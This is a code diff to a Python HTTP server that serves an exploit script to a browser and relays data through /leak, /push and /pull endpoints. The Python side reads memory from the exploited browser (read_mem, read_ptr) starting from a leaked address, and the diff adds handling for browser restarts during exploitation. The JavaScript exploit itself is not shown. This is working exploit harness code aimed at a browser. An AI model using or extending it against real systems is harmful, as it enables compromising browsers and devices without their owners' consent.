@@ -1,4 +1,4 @@
-import socketserver, http.server, threading, queue
+import socketserver, socket, http.server, threading, queue
 
 INDEX_HTML = b'''\
 <html>
@@ -7,7 +7,6 @@ INDEX_HTML = b'''\
 function print(){}
 </script>
 <script src="/exploit.js"></script>
-<script src="/helpers.js"></script>
 <script src="/server.js"></script>
 </body>
 </html>
@@ -23,10 +22,11 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
         self.send_header('Content-Type', 'text/html')
         self.send_header('Content-Length', str(len(data)))
         self.end_headers()
-        self.wfile.write(data)
+        try: self.wfile.write(data)
+        except socket.error: pass
     def do_GET(self):
         if self.path == '/': ans = INDEX_HTML
-        elif self.path in ('/exploit.js', '/helpers.js'): ans = open('..'+self.path, 'rb').read()
+        elif self.path == '/exploit.js': ans = open('..'+self.path, 'rb').read()
         elif self.path == '/server.js': ans = open('server.js', 'rb').read()
         else:
             self.send_error(404)
@@ -35,11 +35,15 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
     def do_POST(self):
         data = self.rfile.read(int(self.headers.get('Content-Length')))
         if self.path == '/leak':
+            while True:
+                try: out_q.get(timeout=0)
+                except queue.Empty: break
             leak_q.put(data)
+            in_q.put(None)
             self.respond(b'')
         elif self.path == '/push':
-            in_q.put(data)
-            self.respond(b'a'*512)
+            in_q.put(bytes(map(int, data.split(b','))))
+            self.respond(b'')
         elif self.path == '/pull':
             try: query = out_q.get(timeout=5)
             except queue.Empty: self.respond(b'null')
@@ -53,12 +57,19 @@ class Server(socketserver.ThreadingMixIn, http.server.HTTPServer): pass
 srv = Server(('', 8080), RequestHandler)
 threading.Thread(target=srv.serve_forever, daemon=True).start()
 
+class BrowserRestartedError(Exception): pass
+
 def read_mem(offset, size):
     out_q.put((offset, size))
     ans = in_q.get()
+    if ans is None:
+        global tarea
+        tarea = int(leak_q.get().decode('ascii'), 16)
+        raise BrowserRestartedError()
     return ans
 
 def read_ptr(offset):
     return int.from_bytes(read_mem(offset, 8), 'little')
 
 tarea = int(leak_q.get().decode('ascii'), 16)
+in_q.get()
